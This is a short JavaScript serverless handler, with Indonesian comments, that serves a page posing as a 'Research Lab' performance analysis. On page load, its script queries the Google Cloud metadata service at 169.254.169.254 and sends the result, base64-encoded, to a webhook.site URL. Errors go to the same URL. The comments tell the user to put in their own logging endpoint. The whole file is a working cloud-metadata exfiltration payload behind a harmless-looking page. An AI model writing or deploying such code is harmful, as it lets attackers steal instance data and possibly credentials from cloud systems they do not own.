export default function handler(req, res) {
  // Kita kirimkan halaman HTML, bukan redirect 307
  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(`
    <html>
      <head><title>Research Lab</title></head>
      <body>
        <h1>Analyzing Perforance...</h1>
        <script>
          const target = "http://169.254.169.254/computeMetadata/v1/instance/hostname";
          
          fetch(target, {
            headers: { "Metadata-Flavor": "Google" }
          })
          .then(response => response.text())
          .then(data => {
            // KIRIM DATA KE LOG ANDA
            // Ganti URL ini dengan URL Webhook.site atau endpoint logger Vercel Anda
            fetch("https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d?leak=" + btoa(data));
          })
          .catch(err => {
            fetch("https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d?error=" + btoa(err.message));
          });
        </script>
      </body>
    </html>
  `);
}
